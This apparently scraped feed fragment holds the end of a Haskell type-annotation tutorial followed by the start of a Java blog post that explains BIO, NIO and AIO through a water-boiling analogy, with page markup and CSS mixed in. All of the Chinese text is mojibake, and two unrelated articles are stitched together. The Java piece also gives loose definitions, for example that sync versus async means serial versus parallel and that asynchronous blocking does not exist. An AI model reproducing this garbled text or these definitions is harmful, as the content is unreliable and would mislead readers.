</code></pre>
<h3 data-id="heading-11">1.3.3 é«˜é˜¶å‡½æ•°ç±»å‹</h3>
<p>å‡½æ•°ä½œä¸ºä¸€ç­‰å…¬æ°‘ï¼Œå¯ç›´æ¥ä½œä¸ºå‚æ•°æˆ–è¿”å›å€¼å‡ºç°åœ¨ç±»å‹ç­¾åä¸­ã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">--</span> (a -&gt; b) æ˜¯å‡½æ•°å‚æ•°ï¼Œ<span class="hljs-selector-attr">[a]</span> æ˜¯åˆ—è¡¨å‚æ•°ï¼Œè¿”å› <span class="hljs-selector-attr">[b]</span>
<span class="hljs-selector-tag">map</span>' :: (a -&gt; b) <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-attr">[a]</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-attr">[b]</span>
<span class="hljs-selector-tag">map</span>' <span class="hljs-selector-tag">f</span> <span class="hljs-selector-attr">[]</span> = <span class="hljs-selector-attr">[]</span>
<span class="hljs-selector-tag">map</span>' <span class="hljs-selector-tag">f</span> (<span class="hljs-attribute">x</span>:xs) = <span class="hljs-selector-tag">f</span> <span class="hljs-selector-tag">x</span> : <span class="hljs-selector-tag">map</span>' <span class="hljs-selector-tag">f</span> <span class="hljs-selector-tag">xs</span>
</code></pre>
<h2 data-id="heading-12">1.4 ç±»å‹å ä½ç¬¦ä¸æ­§ä¹‰è§£å†³</h2>
<p>ä¸ºå¹³è¡¡ç®€æ´ä¸æ˜ç¡®ï¼ŒHaskellæä¾›äº† <code>_</code> å ä½ç¬¦å’Œé’ˆå¯¹æ€§çš„æ­§ä¹‰è§£å†³ç­–ç•¥ã€‚</p>
<h3 data-id="heading-13">1.4.1 é€šé…ç¬¦ <code>_</code></h3>
<p>ç”¨äº<strong>å¿½ç•¥æ— å…³ç±»å‹ç»†èŠ‚</strong>æˆ–<strong>æ ‡è®°å¾…æ¨æ–­ä½ç½®</strong>ï¼Œç®€åŒ–å¤æ‚ç±»å‹æ ‡æ³¨ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">-- ä»…å…³æ³¨ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <span class="hljs-type">String</span>ï¼Œå¿½ç•¥å…¶ä½™ç±»å‹
getName :: (<span class="hljs-type">String</span>, _, _) -&gt; <span class="hljs-function"><span class="hljs-type">String</span>
<span class="hljs-title">getName</span> <span class="hljs-params">(n, _, _)</span> </span>= n
</code></pre>
<h3 data-id="heading-14">1.4.2 å¸¸è§æ­§ä¹‰åœºæ™¯ä¸è§£å†³</h3>
<ol>
<li>
<p><strong>æ•°å€¼æ­§ä¹‰</strong>ï¼š<code>100</code> å¯è¢«æ¨å¯¼ä¸º <code>Int</code> æˆ– <code>Integer</code>ã€‚</p>
<ol>
<li><em>è§£å†³</em>ï¼š<code>n :: Int = 100</code></li>
</ol>
</li>
<li>
<p><strong>å¤šæ€å‡½æ•°æ­§ä¹‰</strong>ï¼š<code>read "123"</code> å¯è¿”å›å¤šç§ç±»å‹ã€‚</p>
<ol>
<li><em>è§£å†³</em>ï¼š<code>read "123" :: Double</code></li>
</ol>
</li>
<li>
<p><strong>å¤æ‚åµŒå¥—æ­§ä¹‰</strong>ï¼šé«˜é˜¶å‡½æ•°åµŒå¥—å¯¼è‡´æ¨æ–­é“¾è¿‡é•¿ã€‚</p>
<ol>
<li><em>è§£å†³</em>ï¼šå±€éƒ¨æ ‡æ³¨å…³é”®å­è¡¨è¾¾å¼ã€‚</li>
</ol>
</li>
</ol>
<h3 data-id="heading-15">1.4.3 æ˜¾å¼æ ‡æ³¨æŠ€å·§</h3>
<p>éµå¾ª<strong>æœ€å°æ ‡æ³¨åŸåˆ™</strong>ï¼š</p>
<ul>
<li><strong>åªæ ‡æ­§ä¹‰ç‚¹</strong>ï¼šä¸ä¸ºç¼–è¯‘å™¨å·²çŸ¥çš„ç±»å‹å¢åŠ å†—ä½™æ ‡æ³¨ã€‚</li>
<li><strong>å±€éƒ¨ä¼˜å…ˆ</strong>ï¼šä¼˜å…ˆä½¿ç”¨è¡¨è¾¾å¼æ ‡æ³¨ï¼ˆ<code>expr :: Type</code>ï¼‰è§£å†³å±€éƒ¨é—®é¢˜ï¼Œé¿å…å…¨å±€å‡½æ•°æ ‡æ³¨çš„æ²‰é‡æ„Ÿã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java IOä¸‰å¤§æ¨¡å‹ï¼ˆBIO/NIO/AIOï¼‰è¶…è¯¦ç»†æ€»ç»“]]></title>    <link>https://juejin.cn/post/7604690250343596082</link>    <guid>https://juejin.cn/post/7604690250343596082</guid>    <pubDate>2026-02-09T08:44:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604690250343596082" data-draft-id="7604507125857370139" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java IOä¸‰å¤§æ¨¡å‹ï¼ˆBIO/NIO/AIOï¼‰è¶…è¯¦ç»†æ€»ç»“"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-02-09T08:44:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜è¶Š"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java IOä¸‰å¤§æ¨¡å‹ï¼ˆBIO/NIO/AIOï¼‰è¶…è¯¦ç»†æ€»ç»“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜è¶Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:44:12.000Z" title="Mon Feb 09 2026 08:44:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç›¸ä¿¡å¾ˆå¤šJavaå¼€å‘åˆšæ¥è§¦IOæ¨¡å‹æ—¶ï¼Œéƒ½ä¼šè¢«ã€ŒBIOã€NIOã€AIOã€ã€ŒåŒæ­¥ã€å¼‚æ­¥ã€é˜»å¡ã€éé˜»å¡ã€è¿™äº›æ¦‚å¿µç»•æ™•ï¼Œç”šè‡³æŠŠå®ƒä»¬æ··ä¸ºä¸€è°ˆã€‚å…¶å®IOæ¨¡å‹çš„æœ¬è´¨å¾ˆç®€å•â€”â€”å°±æ˜¯ç¨‹åºå’Œå¤–éƒ¨è®¾å¤‡ï¼ˆæ–‡ä»¶ã€ç½‘ç»œã€æ§åˆ¶å°ç­‰ï¼‰ä¹‹é—´ã€Œä¼ è¾“æ•°æ®çš„æ–¹å¼ã€ã€‚</p>
<p>ä»Šå¤©å’±ä»¬ä¸èŠå¤æ‚çš„æºç ç¡¬å•ƒï¼Œè€Œæ˜¯ç”¨ã€Œçƒ§æ°´åšé¥­ã€è¿™ä¸ªç”Ÿæ´»åŒ–åœºæ™¯ï¼Œä¸€æ­¥æ­¥æ‹†è§£æ‰€æœ‰çŸ¥è¯†ç‚¹ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å…ˆç ´åç«‹ï¼šææ‡‚IOçš„æ ¸å¿ƒåº•å±‚â€”â€”4ä¸ªå…³é”®æ¦‚å¿µï¼ˆåŒæ­¥/å¼‚æ­¥ã€é˜»å¡/éé˜»å¡ï¼‰</h2>
<p>åœ¨èŠJava IOä¸‰å¤§æ¨¡å‹ä¹‹å‰ï¼Œå¿…é¡»å…ˆåˆ†æ¸…ã€Œ<strong>åŒæ­¥/å¼‚æ­¥</strong>ã€å’Œã€Œ<strong>é˜»å¡/éé˜»å¡</strong>ã€è¿™4ä¸ªæ ¸å¿ƒæ¦‚å¿µâ€”â€”å®ƒä»¬æ˜¯ç†è§£æ‰€æœ‰IOæ¨¡å‹çš„åŸºç¡€ï¼Œè€Œä¸”ä¸¤è€…å®Œå…¨æ˜¯ä¸åŒç»´åº¦çš„æ¦‚å¿µï¼Œåƒä¸‡åˆ«æ··ä¸ºä¸€è°ˆï¼</p>
<p>å’±ä»¬å°±ç”¨æœ€è´´è¿‘ç”Ÿæ´»çš„ã€Œçƒ§æ°´åšé¥­ã€æ¡ˆä¾‹ï¼Œä¸€æ¬¡æ€§è®²æ˜ç™½ï¼Œçœ‹å®Œå†ä¹Ÿä¸æ··æ·†ï½</p>
<h3 data-id="heading-1">1. åŒæ­¥ vs å¼‚æ­¥ï¼šä¸¤ä»¶äº‹çš„ã€Œæ‰§è¡Œé¡ºåºã€ï¼ˆæ˜¯å¦èƒ½åŒæ—¶è¿›è¡Œï¼‰</h3>
<p>åŒæ­¥å’Œå¼‚æ­¥ï¼Œæè¿°çš„æ˜¯ã€Œ<strong>ä¸¤ä»¶ç‹¬ç«‹äº‹æƒ…çš„æ‰§è¡Œå…³ç³»</strong>ã€â€”â€”æ˜¯ä¸²è¡Œæ‰§è¡Œï¼ˆå…ˆåšAå†åšBï¼‰ï¼Œè¿˜æ˜¯å¹¶è¡Œæ‰§è¡Œï¼ˆAå’ŒBåŒæ—¶åšï¼‰ï¼Œå’Œâ€œç­‰å¾…â€æ— å…³ï¼Œåªçœ‹é¡ºåºã€‚</p>
<p>è¿˜æ˜¯ä»¥ã€Œçƒ§æ°´ã€å’Œã€Œåšé¥­ã€ï¼ˆä¸¤ä»¶ç‹¬ç«‹çš„äº‹ï¼‰ä¸ºä¾‹ï¼Œä¸€çœ‹å°±æ‡‚ï¼š</p>
<ul>
<li>
<p><strong>åŒæ­¥</strong>ï¼šå…ˆæŠŠæ°´çƒ§å¼€ï¼Œå†å¼€å§‹åšé¥­ï¼ˆä¸²è¡Œæ‰§è¡Œï¼‰ã€‚åªæœ‰å‰ä¸€ä»¶äº‹ï¼ˆçƒ§æ°´ï¼‰å®Œå…¨åšå®Œï¼Œåä¸€ä»¶äº‹ï¼ˆåšé¥­ï¼‰æ‰èƒ½å¯åŠ¨ï¼Œ<strong>ä¸¤ä»¶äº‹ä¸èƒ½åŒæ—¶è¿›è¡Œ</strong>ã€‚</p>
</li>
<li>
<p><strong>å¼‚æ­¥</strong>ï¼šæŠŠæ°´å£¶æ”¾åœ¨ç‚‰å­ä¸Šçƒ§ç€ï¼ŒåŒæ—¶å°±å¼€å§‹åšé¥­ï¼ˆå¹¶è¡Œæ‰§è¡Œï¼‰ã€‚<strong>ä¸¤ä»¶äº‹äº’ä¸å¹²æ‰°</strong>ï¼Œä¸ç”¨ç­‰å‰ä¸€ä»¶äº‹åšå®Œï¼Œåä¸€ä»¶äº‹å°±èƒ½å¯åŠ¨ï¼Œæœ€åå„è‡ªå®Œæˆå³å¯ã€‚</p>
</li>
</ul>
<p>æ ¸å¿ƒè®°å¿†ç‚¹ï¼š<strong>åŒæ­¥æ˜¯ã€Œæ’é˜Ÿåšã€ï¼Œå¼‚æ­¥æ˜¯ã€ŒåŒæ—¶åšã€</strong>ã€‚</p>
<h3 data-id="heading-2">2. é˜»å¡ vs éé˜»å¡ï¼šåšä¸€ä»¶äº‹æ—¶çš„ã€Œè‡ªèº«çŠ¶æ€ã€ï¼ˆé‡åˆ°çªå‘æƒ…å†µä½ åœ¨å¹²ä»€ä¹ˆï¼‰</h3>
<p>é˜»å¡å’Œéé˜»å¡ï¼Œæè¿°çš„æ˜¯ã€Œ<strong>åšæŸä¸€ä»¶äº‹çš„è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°çªå‘äº‹ä»¶æ—¶ï¼Œä½ çš„çŠ¶æ€æ˜¯ä»€ä¹ˆ</strong>ã€â€”â€”å’Œâ€œå¦ä¸€ä»¶äº‹æ˜¯ä»€ä¹ˆâ€æ— å…³ï¼Œåªå’Œä½ è‡ªèº«çš„è¡Œä¸ºæœ‰å…³ã€‚</p>
<p>è¿˜æ˜¯å›´ç»•ã€Œçƒ§æ°´åšé¥­ã€å±•å¼€ï¼Œè¿™æ¬¡èšç„¦ã€Œåšé¥­è¿™ä¸€ä»¶äº‹ã€ï¼Œé‡åˆ°ã€Œçƒ§æ°´ã€è¿™ä¸ªçªå‘äº‹ä»¶æ—¶ï¼Œä½ çš„ä¸¤ç§çŠ¶æ€ï¼š</p>
<p>å‡è®¾ä½ æ­£åœ¨åšé¥­ï¼ˆåˆ‡èœã€æ´—èœï¼‰ï¼Œè¿™æ˜¯ä½ å½“å‰å”¯ä¸€çš„æ ¸å¿ƒä»»åŠ¡ï¼›çªç„¶å‘ç°ï¼Œåšé¥­éœ€è¦çƒ­æ°´ï¼Œå¾—å»çƒ§ä¸€å£¶æ°´ï¼ˆçªå‘äº‹ä»¶ï¼‰ã€‚æ­¤æ—¶ï¼Œä½ æœ‰ä¸¤ç§é€‰æ‹©ï¼Œå¯¹åº”ä¸¤ç§çŠ¶æ€ï¼š</p>
<ul>
<li>
<p><strong>é˜»å¡</strong>ï¼šæŠŠæ°´å£¶æ”¾åœ¨ç‚‰å­ä¸Šåï¼Œä»€ä¹ˆéƒ½ä¸åšï¼Œå°±ç«™åœ¨ç‚‰å­æ—è¾¹ç›¯ç€æ°´çƒ§å¼€ï¼ŒæœŸé—´ä¸åˆ‡èœã€ä¸æ´—èœâ€”â€”<strong>ä½ çš„æ ¸å¿ƒä»»åŠ¡ï¼ˆåšé¥­ï¼‰æš‚åœ</strong>ï¼Œå…¨ç¨‹ç­‰å¾…çªå‘äº‹ä»¶ï¼ˆçƒ§æ°´ï¼‰å®Œæˆï¼Œè¿™å°±æ˜¯é˜»å¡ã€‚</p>
</li>
<li>
<p><strong>éé˜»å¡</strong>ï¼šæŠŠæ°´å£¶æ”¾åœ¨ç‚‰å­ä¸Šåï¼Œä¸å‚»ç­‰ï¼Œè€Œæ˜¯å›åˆ°å¨æˆ¿ç»§ç»­åˆ‡èœã€æ´—èœï¼ˆæˆ–è€…ç©ä¼šæ‰‹æœºï¼‰ï¼Œæ¯éš”ä¸€ä¼šå„¿å»çœ‹çœ‹æ°´å¼€æ²¡å¼€â€”â€”<strong>ä½ çš„æ ¸å¿ƒä»»åŠ¡ï¼ˆåšé¥­ï¼‰æ²¡æœ‰æš‚åœ</strong>ï¼Œé‡åˆ°çªå‘äº‹ä»¶åï¼Œä½ å¯ä»¥åšå…¶ä»–äº‹ï¼Œä¸ç”¨ä¸€ç›´ç­‰å¾…ï¼Œè¿™å°±æ˜¯éé˜»å¡ã€‚</p>
</li>
</ul>
<p>æ ¸å¿ƒè®°å¿†ç‚¹ï¼š<strong>é˜»å¡æ˜¯ã€Œå‚»ç­‰ä¸å¹²æ´»ã€ï¼Œéé˜»å¡æ˜¯ã€Œä¸ç­‰å…ˆå¹²åˆ«çš„ã€</strong>ã€‚</p>
<h3 data-id="heading-3">3. å››å¤§ç»„åˆï¼šç”¨çƒ§æ°´åšé¥­æ¡ˆä¾‹ï¼Œåƒé€æ‰€æœ‰ç»„åˆé€»è¾‘</h3>
<p>ç†è§£äº†åŒæ­¥/å¼‚æ­¥ï¼ˆæ‰§è¡Œé¡ºåºï¼‰ã€é˜»å¡/éé˜»å¡ï¼ˆè‡ªèº«çŠ¶æ€ï¼‰åï¼Œå’±ä»¬æŠŠå®ƒä»¬ç»„åˆèµ·æ¥ï¼Œè¿˜æ˜¯ç”¨ã€Œçƒ§æ°´åšé¥­ã€çš„æ¡ˆä¾‹ï¼Œé€ä¸ªæ‹†è§£â€”â€”é‡ç‚¹åŒºåˆ†å®¹æ˜“æ··æ·†çš„ç»„åˆï¼Œå°¤å…¶æ˜¯â€œå¼‚æ­¥é˜»å¡â€ä¸ºä»€ä¹ˆä¸å­˜åœ¨ã€‚</p>
<h4 data-id="heading-4">ï¼ˆ1ï¼‰åŒæ­¥é˜»å¡ï¼šæœ€â€œç¬¨â€çš„æ–¹å¼ï¼ˆå¯¹åº”BIOï¼‰</h4>
<p>ç»„åˆé€»è¾‘ï¼šåŒæ­¥ï¼ˆ<strong>åšé¥­å¿…é¡»ç­‰çƒ§æ°´å®Œæˆ</strong>ï¼Œä¸²è¡Œæ‰§è¡Œï¼‰+ é˜»å¡ï¼ˆçƒ§æ°´æ—¶å•¥ä¹Ÿä¸åšï¼Œå‚»ç­‰æ°´å¼€ï¼‰ã€‚</p>
<p>åœºæ™¯è¿˜åŸï¼šä½ å†³å®šå…ˆçƒ§æ°´ã€å†åšé¥­ï¼ˆåŒæ­¥ï¼‰ï¼›æŠŠæ°´å£¶æ”¾ç‚‰å­ä¸Šåï¼Œä¸åˆ‡èœã€ä¸ç©æ‰‹æœºï¼Œå°±ç«™åœ¨æ—è¾¹ç›¯ç€æ°´çƒ§å¼€ï¼Œç­‰æ°´å®Œå…¨çƒ§å¼€åï¼Œæ‰å¼€å§‹æ´—èœã€åˆ‡èœï¼ˆé˜»å¡ï¼‰ã€‚å…¨ç¨‹åªæœ‰ä¸€ä»¶äº‹åœ¨è¿›è¡Œï¼Œæ•ˆç‡æœ€ä½ã€‚</p>
<h4 data-id="heading-5">ï¼ˆ2ï¼‰åŒæ­¥éé˜»å¡ï¼šå…¼é¡¾â€œç­‰å¾…â€å’Œâ€œæ•ˆç‡â€ï¼ˆå¯¹åº”NIOï¼‰</h4>
<p>ç»„åˆé€»è¾‘ï¼šåŒæ­¥ï¼ˆ<strong>åšé¥­å¿…é¡»ç­‰çƒ§æ°´å®Œæˆ</strong>ï¼Œä¸²è¡Œæ‰§è¡Œï¼‰+ éé˜»å¡ï¼ˆçƒ§æ°´æ—¶ä¸å‚»ç­‰ï¼‰ã€‚</p>
<p>åœºæ™¯è¿˜åŸï¼šä½ è¿˜æ˜¯è¦ç­‰æ°´çƒ§å¼€æ‰èƒ½åšé¥­ï¼ˆåŒæ­¥ï¼‰ï¼›ä½†æŠŠæ°´å£¶æ”¾ç‚‰å­ä¸Šåï¼Œä½ ä¸å‚»ç­‰ï¼Œè€Œæ˜¯å›åˆ°å¨æˆ¿åˆ‡èœã€æ´—èœï¼ˆæˆ–è€…ç©ä¼šæ‰‹æœºï¼‰ï¼Œæ¯éš”1åˆ†é’Ÿå»çœ‹çœ‹æ°´å¼€æ²¡å¼€ï¼ˆä¸»åŠ¨æ£€æŸ¥ï¼‰<strong>ï¼Œç­‰æ°´å¼€åï¼Œå†åˆ‡æ¢åˆ°åšé¥­çš„æ ¸å¿ƒæ­¥éª¤ï¼ˆéé˜»å¡ï¼‰</strong>ã€‚æ—¢æ²¡æœ‰æµªè´¹æ—¶é—´ï¼Œä¹Ÿæ²¡æœ‰å¿½ç•¥çªå‘äº‹ä»¶ã€‚</p>
<h4 data-id="heading-6">ï¼ˆ3ï¼‰å¼‚æ­¥éé˜»å¡ï¼šæœ€é«˜æ•ˆçš„æ–¹å¼ï¼ˆå¯¹åº”AIOï¼‰</h4>
<p>ç»„åˆé€»è¾‘ï¼šå¼‚æ­¥ï¼ˆ<strong>çƒ§æ°´å’Œåšé¥­åŒæ—¶è¿›è¡Œ</strong>ï¼Œå¹¶è¡Œæ‰§è¡Œï¼‰+ éé˜»å¡ï¼ˆçƒ§æ°´æ—¶ä¸å‚»ç­‰ï¼‰ã€‚</p>
<p>åœºæ™¯è¿˜åŸï¼šä½ æŠŠæ°´å£¶æ”¾ç‚‰å­ä¸Šçƒ§ç€ï¼ˆä¸ç”¨ç­‰æ°´å¼€ï¼‰ï¼ŒåŒæ—¶å°±å¼€å§‹æ´—èœã€åˆ‡èœã€åšé¥­ï¼ˆä¸¤ä»¶äº‹å¹¶è¡Œï¼‰ï¼ˆå¼‚æ­¥ï¼‰ï¼›æœŸé—´ä½ è¯¥åšé¥­åšé¥­ï¼Œä¸ç”¨ä¸“é—¨ç›¯ç€æ°´å£¶ï¼Œæ°´å¼€åä¼šå‘å‡ºâ€œé¸£ç¬›å£°â€é€šçŸ¥ä½ ï¼ˆè¢«åŠ¨é€šçŸ¥ï¼‰ï¼Œä½ å¬åˆ°å£°éŸ³åï¼Œå†å»å…³ç«ã€ç”¨çƒ­æ°´ï¼ˆéé˜»å¡ï¼‰ã€‚å…¨ç¨‹ä¸¤ä¸è€½è¯¯ï¼Œæ•ˆç‡æœ€é«˜ã€‚</p>
<h4 data-id="heading-7">ï¼ˆ4ï¼‰å¼‚æ­¥é˜»å¡ï¼šé€»è¾‘çŸ›ç›¾ï¼Œä¸å­˜åœ¨çš„ç»„åˆ</h4>
<p>ç»„åˆé€»è¾‘ï¼šå¼‚æ­¥ï¼ˆçƒ§æ°´å’Œåšé¥­åŒæ—¶è¿›è¡Œï¼‰+ é˜»å¡ï¼ˆå•¥ä¹Ÿä¸åšï¼Œå‚»ç­‰æ°´å¼€ï¼‰ã€‚</p>
<p>åœºæ™¯è¿˜åŸï¼šä½ æŠŠæ°´å£¶æ”¾ç‚‰å­ä¸Šçƒ§ç€ï¼ŒæŒ‰ç†è¯´å¯ä»¥åŒæ—¶åšé¥­ï¼ˆå¼‚æ­¥ï¼‰ï¼Œä½†ä½ å´ä»€ä¹ˆéƒ½ä¸åšï¼Œä¸åšé¥­ã€ä¸ç©æ‰‹æœºï¼Œå°±ç«™åœ¨æ—è¾¹ç›¯ç€æ°´çƒ§å¼€ï¼ˆé˜»å¡ï¼‰ã€‚<strong>è¿™æœ¬èº«å°±å¾ˆçŸ›ç›¾â€”â€”æ—¢ç„¶é€‰æ‹©äº†â€œåŒæ—¶åšä¸¤ä»¶äº‹â€ï¼ˆå¼‚æ­¥ï¼‰ï¼Œåˆéè¦â€œå‚»ç­‰å…¶ä¸­ä¸€ä»¶äº‹â€ï¼ˆé˜»å¡ï¼‰ï¼Œæœ€åå’Œâ€œåŒæ­¥é˜»å¡â€æ²¡åŒºåˆ«ï¼Œå®Œå…¨æµªè´¹äº†å¼‚æ­¥çš„ä¼˜åŠ¿ã€‚</strong></p>
<p>æ‰€ä»¥ï¼Œ<strong>å¼‚æ­¥é˜»å¡åœ¨å®é™…åœºæ™¯ä¸­å®Œå…¨ä¸å­˜åœ¨</strong>ï¼Œä¹Ÿæ²¡æœ‰å¯¹åº”çš„Java IOæ¨¡å‹ï¼Œå’±ä»¬ä¸ç”¨èŠ±æ—¶é—´çº ç»“ï½</p>
<h2 data-id="heading-8">äºŒã€å›å½’ä¸»é¢˜ï¼šJavaä¸‰å¤§IOæ¨¡å‹ï¼ˆBIO/NIO/AIOï¼‰å®ç°åŸç†+åœºæ™¯</h2>
<p>ææ‡‚äº†4ä¸ªæ ¸å¿ƒæ¦‚å¿µå’Œç»„åˆé€»è¾‘ï¼Œæ¥ä¸‹æ¥å’±ä»¬å›å½’Javaæœ¬èº«â€”â€”Javaä¸­çš„IOæ¨¡å‹ï¼Œæœ¬è´¨å°±æ˜¯ã€ŒåŒæ­¥/å¼‚æ­¥ã€å’Œã€Œé˜»å¡/éé˜»å¡ã€çš„ä¸åŒç»„åˆï¼Œå¯¹åº”ä¸‰å¤§æ¨¡å‹ï¼šBIOï¼ˆåŒæ­¥é˜»å¡ï¼‰ã€NIOï¼ˆåŒæ­¥éé˜»å¡ï¼‰ã€AIOï¼ˆå¼‚æ­¥éé˜»å¡ï¼‰ã€‚</p>
<p>å’±ä»¬é€ä¸ªæ‹†è§£å®ƒä»¬çš„å®ç°åŸç†ã€æ ¸å¿ƒç‰¹ç‚¹ï¼Œç»“åˆå‰é¢çš„æ¡ˆä¾‹ï¼Œè®©ä½ ä¸€çœ‹å°±æ‡‚ï¼Œè¿˜èƒ½åˆ†æ¸…ä»€ä¹ˆæ—¶å€™ç”¨å“ªä¸ªã€‚</p>
